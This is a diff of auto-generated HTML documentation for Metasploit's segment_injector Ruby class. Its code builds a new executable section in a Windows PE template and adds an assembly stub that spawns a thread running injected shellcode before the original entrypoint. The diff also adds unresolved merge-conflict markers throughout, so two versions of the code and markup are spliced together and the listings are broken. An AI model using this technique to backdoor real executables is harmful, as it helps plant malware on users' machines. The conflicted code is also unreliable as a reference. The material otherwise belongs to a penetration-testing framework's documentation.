@@ -256,6 +256,7 @@
         <li class="public ">
   <span class="summary_signature">
     
+<<<<<<< HEAD
       <a href="#create_thread_stub_x64-instance_method" title="#create_thread_stub_x64 (instance method)">- (Object) <strong>create_thread_stub_x64</strong> </a>
     
 
@@ -324,6 +325,8 @@
         <li class="public ">
   <span class="summary_signature">
     
+=======
+>>>>>>> origin/gh-pages
       <a href="#generate_pe-instance_method" title="#generate_pe (instance method)">- (Object) <strong>generate_pe</strong> </a>
     
 
@@ -475,6 +478,7 @@
 19
 20
 21
+<<<<<<< HEAD
 22
 23
 24
@@ -488,6 +492,9 @@
 32
 33
 34</pre>
+=======
+22</pre>
+>>>>>>> origin/gh-pages
     </td>
     <td>
       <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 14</span>
@@ -496,6 +503,7 @@
   <span class='ivar'>@payload</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:payload</span><span class='rbracket'>]</span>
   <span class='ivar'>@template</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:template</span><span class='rbracket'>]</span>
   <span class='ivar'>@arch</span>  <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:arch</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='symbol'>:x86</span>
+<<<<<<< HEAD
   <span class='ivar'>@buffer_register</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:buffer_register</span><span class='rbracket'>]</span>
 
   <span class='id identifier rubyid_x86_regs'>x86_regs</span> <span class='op'>=</span> <span class='qwords_beg'>%w{</span><span class='tstring_content'>eax</span><span class='words_sep'> </span><span class='tstring_content'>ecx</span><span class='words_sep'> </span><span class='tstring_content'>edx</span><span class='words_sep'> </span><span class='tstring_content'>ebx</span><span class='words_sep'> </span><span class='tstring_content'>edi</span><span class='words_sep'> </span><span class='tstring_content'>esi</span><span class='words_sep'>}</span>
@@ -510,6 +518,10 @@
   <span class='kw'>if</span> <span class='ivar'>@arch</span> <span class='op'>==</span> <span class='symbol'>:x86</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_x86_regs'>x86_regs</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='ivar'>@buffer_register</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span><span class='rparen'>)</span>
     <span class='id identifier rubyid_raise'>raise</span> <span class='const'>ArgumentError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>:buffer_register is not a real register</span><span class='tstring_end'>&quot;</span></span>
   <span class='kw'>elsif</span> <span class='ivar'>@arch</span> <span class='op'>==</span> <span class='symbol'>:x64</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_x64_regs'>x64_regs</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='ivar'>@buffer_register</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span><span class='rparen'>)</span>
+=======
+  <span class='ivar'>@buffer_register</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:buffer_register</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>edx</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>unless</span> <span class='qwords_beg'>%w{</span><span class='tstring_content'>eax</span><span class='words_sep'> </span><span class='tstring_content'>ecx</span><span class='words_sep'> </span><span class='tstring_content'>edx</span><span class='words_sep'> </span><span class='tstring_content'>ebx</span><span class='words_sep'> </span><span class='tstring_content'>edi</span><span class='words_sep'> </span><span class='tstring_content'>esi</span><span class='words_sep'>}</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='ivar'>@buffer_register</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span><span class='rparen'>)</span>
+>>>>>>> origin/gh-pages
     <span class='id identifier rubyid_raise'>raise</span> <span class='const'>ArgumentError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>:buffer_register is not a real register</span><span class='tstring_end'>&quot;</span></span>
   <span class='kw'>end</span>
 <span class='kw'>end</span></pre>
@@ -717,6 +729,23 @@
       <pre class="lines">
 
 
+<<<<<<< HEAD
+=======
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+>>>>>>> origin/gh-pages
 47
 48
 49
@@ -726,6 +755,7 @@
 53
 54
 55
+<<<<<<< HEAD
 56</pre>
     </td>
     <td>
@@ -823,14 +853,48 @@
     call rax
     add rsp,10h ; clean up the push 0 above
 
+=======
+56
+57
+58
+59
+60</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 33</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_create_thread_stub'>create_thread_stub</span>
+  <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    pushad
+    push hook_libname
+    call [iat_LoadLibraryA]
+    push hook_funcname
+    push eax
+    call [iat_GetProcAddress]
+    lea edx, [thread_hook]
+    push 0
+    push 0
+    push 0
+    push edx
+    push 0
+    push 0
+    call eax
+
+    popad
+>>>>>>> origin/gh-pages
     jmp entrypoint
 
     hook_libname db &#39;kernel32&#39;, 0
     hook_funcname db &#39;CreateThread&#39;, 0
 
     thread_hook:
+<<<<<<< HEAD
     mov </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_buffer_register'>buffer_register</span><span class='embexpr_end'>}</span><span class='tstring_content'>, shellcode
     shellcode:
+=======
+    lea </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_buffer_register'>buffer_register</span><span class='embexpr_end'>}</span><span class='tstring_content'>, [thread_hook]
+    add </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_buffer_register'>buffer_register</span><span class='embexpr_end'>}</span><span class='tstring_content'>, 9
+>>>>>>> origin/gh-pages
 </span><span class='heredoc_end'>  EOS
 </span><span class='kw'>end</span></pre>
     </td>
@@ -839,9 +903,15 @@
 </div>
     
       <div class="method_details ">
+<<<<<<< HEAD
   <h3 class="signature " id="create_thread_stub_x86-instance_method">
   
     - (<tt>Object</tt>) <strong>create_thread_stub_x86</strong> 
+=======
+  <h3 class="signature " id="generate_pe-instance_method">
+  
+    - (<tt>Object</tt>) <strong>generate_pe</strong> 
+>>>>>>> origin/gh-pages
   
 
   
@@ -853,6 +923,16 @@
       <pre class="lines">
 
 
+<<<<<<< HEAD
+=======
+86
+87
+88
+89
+90
+91
+92
+>>>>>>> origin/gh-pages
 93
 94
 95
@@ -880,6 +960,7 @@
 117
 118
 119
+<<<<<<< HEAD
 120</pre>
     </td>
     <td>
@@ -1006,6 +1087,47 @@ executables.</p>
       <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 188</span>
 
 <span class='kw'>def</span> <span class='id identifier rubyid_dll_prefix'>dll_prefix</span><span class='lparen'>(</span><span class='id identifier rubyid_pe'>pe</span><span class='rparen'>)</span>
+=======
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 86</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_pe'>generate_pe</span>
+  <span class='comment'># Copy our Template into a new PE
+</span>  <span class='id identifier rubyid_pe_orig'>pe_orig</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>PE</span><span class='period'>.</span><span class='id identifier rubyid_decode_file'>decode_file</span><span class='lparen'>(</span><span class='id identifier rubyid_template'>template</span><span class='rparen'>)</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_is_warbird?'>is_warbird?</span><span class='lparen'>(</span><span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>The template to inject to appears to have license verification (warbird)</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_pe'>pe</span> <span class='op'>=</span> <span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='period'>.</span><span class='id identifier rubyid_mini_copy'>mini_copy</span>
+
+  <span class='comment'># Copy the headers and exports
+</span>  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_mz'>mz</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span> <span class='op'>=</span> <span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span><span class='lbracket'>[</span><span class='int'>0</span><span class='comma'>,</span> <span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='period'>.</span><span class='id identifier rubyid_coff_offset'>coff_offset</span><span class='op'>-</span><span class='int'>4</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_mz'>mz</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span><span class='period'>.</span><span class='id identifier rubyid_export'>export</span> <span class='op'>=</span> <span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span><span class='lbracket'>[</span><span class='int'>0</span><span class='comma'>,</span> <span class='int'>512</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_export'>export</span><span class='period'>.</span><span class='id identifier rubyid_dup'>dup</span>
+  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_header'>header</span><span class='period'>.</span><span class='id identifier rubyid_time'>time</span> <span class='op'>=</span> <span class='id identifier rubyid_pe_orig'>pe_orig</span><span class='period'>.</span><span class='id identifier rubyid_header'>header</span><span class='period'>.</span><span class='id identifier rubyid_time'>time</span>
+
+  <span class='comment'># Don&#39;t rebase if we can help it since Metasm doesn&#39;t do relocations well
+</span>  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_optheader'>optheader</span><span class='period'>.</span><span class='id identifier rubyid_dll_characts'>dll_characts</span><span class='period'>.</span><span class='id identifier rubyid_delete'>delete</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>DYNAMIC_BASE</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+>>>>>>> origin/gh-pages
   <span class='id identifier rubyid_prefix'>prefix</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
   <span class='kw'>if</span> <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_header'>header</span><span class='period'>.</span><span class='id identifier rubyid_characteristics'>characteristics</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>DLL</span><span class='tstring_end'>&quot;</span></span>
     <span class='comment'># if there is no entry point, just return after we bail or spawn shellcode
@@ -1024,6 +1146,7 @@ entrypoint:
           jnz entrypoint</span><span class='tstring_end'>&quot;</span></span>
     <span class='kw'>end</span>
   <span class='kw'>end</span>
+<<<<<<< HEAD
 
   <span class='id identifier rubyid_prefix'>prefix</span>
 <span class='kw'>end</span></pre>
@@ -1110,6 +1233,12 @@ entrypoint:
 </span>  <span class='id identifier rubyid_s'>s</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>PE</span><span class='op'>::</span><span class='const'>Section</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
   <span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_name'>name</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>.text</span><span class='tstring_end'>&#39;</span></span>
   <span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span> <span class='op'>=</span> <span class='id identifier rubyid_payload_stub'>payload_stub</span><span class='lparen'>(</span><span class='id identifier rubyid_prefix'>prefix</span><span class='rparen'>)</span>
+=======
+  <span class='comment'># Generate a new code section set to RWX with our payload in it
+</span>  <span class='id identifier rubyid_s'>s</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>PE</span><span class='op'>::</span><span class='const'>Section</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
+  <span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_name'>name</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>.text</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span> <span class='op'>=</span> <span class='id identifier rubyid_payload_stub'>payload_stub</span> <span class='id identifier rubyid_prefix'>prefix</span>
+>>>>>>> origin/gh-pages
   <span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_characteristics'>characteristics</span> <span class='op'>=</span> <span class='qwords_beg'>%w[</span><span class='tstring_content'>MEM_READ</span><span class='words_sep'> </span><span class='tstring_content'>MEM_WRITE</span><span class='words_sep'> </span><span class='tstring_content'>MEM_EXECUTE</span><span class='words_sep'>]</span>
 
   <span class='comment'># Tell our section where the original entrypoint was
@@ -1167,6 +1296,7 @@ entrypoint:
       <pre class="lines">
 
 
+<<<<<<< HEAD
 131
 132
 133
@@ -1185,6 +1315,27 @@ entrypoint:
     </td>
     <td>
       <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 131</span>
+=======
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 69</span>
+>>>>>>> origin/gh-pages
 
 <span class='kw'>def</span> <span class='id identifier rubyid_is_warbird?'>is_warbird?</span><span class='lparen'>(</span><span class='id identifier rubyid_pe'>pe</span><span class='rparen'>)</span>
   <span class='comment'># The byte sequence is for the following code pattern:
@@ -1193,9 +1344,16 @@ entrypoint:
 </span>  <span class='comment'># .text:004136BC                 sar     ecx, 1
 </span>  <span class='comment'># .text:004136BE                 mov     eax, [eax+0Ch]
 </span>  <span class='comment'># .text:004136C1                 add     eax, 0Ch
+<<<<<<< HEAD
 </span>  <span class='id identifier rubyid_pattern'>pattern</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x64\xA1\x30\x00\x00\x00\x2B\xCA\xD1\xF9\x8B\x40\x0C\x83\xC0\x0C</span><span class='tstring_end'>&quot;</span></span>
   <span class='id identifier rubyid_section'>section</span> <span class='op'>=</span> <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_sections'>sections</span><span class='period'>.</span><span class='id identifier rubyid_find'>find</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_s'>s</span><span class='op'>|</span> <span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_name'>name</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>.text</span><span class='tstring_end'>&#39;</span></span> <span class='rbrace'>}</span>
   <span class='kw'>if</span> <span class='id identifier rubyid_section'>section</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_section'>section</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span><span class='period'>.</span><span class='id identifier rubyid_pattern_scan'>pattern_scan</span><span class='lparen'>(</span><span class='id identifier rubyid_pattern'>pattern</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_blank?'>blank?</span>
+=======
+</span>  <span class='id identifier rubyid_pattern'>pattern</span> <span class='op'>=</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>\x64\xA1\x30\x00\x00\x00\x2B\xCA\xD1\xF9\x8B\x40\x0C\x83\xC0\x0C</span><span class='regexp_end'>/</span></span>
+  <span class='id identifier rubyid_sections'>sections</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span>
+  <span class='id identifier rubyid_pe'>pe</span><span class='period'>.</span><span class='id identifier rubyid_sections'>sections</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='lbrace'>{</span><span class='op'>|</span><span class='id identifier rubyid_s'>s</span><span class='op'>|</span> <span class='id identifier rubyid_sections'>sections</span><span class='lbracket'>[</span><span class='id identifier rubyid_s'>s</span><span class='period'>.</span><span class='id identifier rubyid_name'>name</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_s'>s</span><span class='rbrace'>}</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_sections'>sections</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>.text</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span><span class='period'>.</span><span class='id identifier rubyid_pattern_scan'>pattern_scan</span><span class='lparen'>(</span><span class='id identifier rubyid_pattern'>pattern</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_blank?'>blank?</span>
+>>>>>>> origin/gh-pages
     <span class='kw'>return</span> <span class='kw'>false</span>
   <span class='kw'>end</span>
 
@@ -1221,6 +1379,7 @@ entrypoint:
       <pre class="lines">
 
 
+<<<<<<< HEAD
 122
 123
 124
@@ -1232,13 +1391,28 @@ entrypoint:
     </td>
     <td>
       <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 122</span>
+=======
+62
+63
+64
+65
+66
+67</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 62</span>
+>>>>>>> origin/gh-pages
 
 <span class='kw'>def</span> <span class='id identifier rubyid_payload_stub'>payload_stub</span><span class='lparen'>(</span><span class='id identifier rubyid_prefix'>prefix</span><span class='rparen'>)</span>
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>hook_entrypoint:\n</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_prefix'>prefix</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span>
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_create_thread_stub'>create_thread_stub</span>
+<<<<<<< HEAD
 
   <span class='id identifier rubyid_shellcode'>shellcode</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='id identifier rubyid_processor'>processor</span><span class='comma'>,</span> <span class='id identifier rubyid_asm'>asm</span><span class='rparen'>)</span>
 
+=======
+  <span class='id identifier rubyid_shellcode'>shellcode</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='id identifier rubyid_processor'>processor</span><span class='comma'>,</span> <span class='id identifier rubyid_asm'>asm</span><span class='rparen'>)</span>
+>>>>>>> origin/gh-pages
   <span class='id identifier rubyid_shellcode'>shellcode</span><span class='period'>.</span><span class='id identifier rubyid_encoded'>encoded</span> <span class='op'>+</span> <span class='ivar'>@payload</span>
 <span class='kw'>end</span></pre>
     </td>
@@ -1261,6 +1435,7 @@ entrypoint:
       <pre class="lines">
 
 
+<<<<<<< HEAD
 36
 37
 38
@@ -1274,6 +1449,19 @@ entrypoint:
     </td>
     <td>
       <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 36</span>
+=======
+24
+25
+26
+27
+28
+29
+30
+31</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/exe/segment_injector.rb', line 24</span>
+>>>>>>> origin/gh-pages
 
 <span class='kw'>def</span> <span class='id identifier rubyid_processor'>processor</span>
   <span class='kw'>case</span> <span class='ivar'>@arch</span>
@@ -1281,8 +1469,11 @@ entrypoint:
     <span class='kw'>return</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Ia32</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
   <span class='kw'>when</span> <span class='symbol'>:x64</span>
     <span class='kw'>return</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X86_64</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
+<<<<<<< HEAD
   <span class='kw'>else</span>
     <span class='id identifier rubyid_raise'>raise</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Incompatible architecture</span><span class='tstring_end'>&quot;</span></span>
+=======
+>>>>>>> origin/gh-pages
   <span class='kw'>end</span>
 <span class='kw'>end</span></pre>
     </td>
@@ -1295,9 +1486,15 @@ entrypoint:
 </div>
 
     <div id="footer">
+<<<<<<< HEAD
   Generated on Tue Dec 22 22:33:59 2015 by
   <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
   0.8.7.6 (ruby-2.1.7).
+=======
+  Generated on Tue Sep  1 22:34:24 2015 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.8.7.6 (ruby-2.1.5).
+>>>>>>> origin/gh-pages
 </div>
 
   </body>
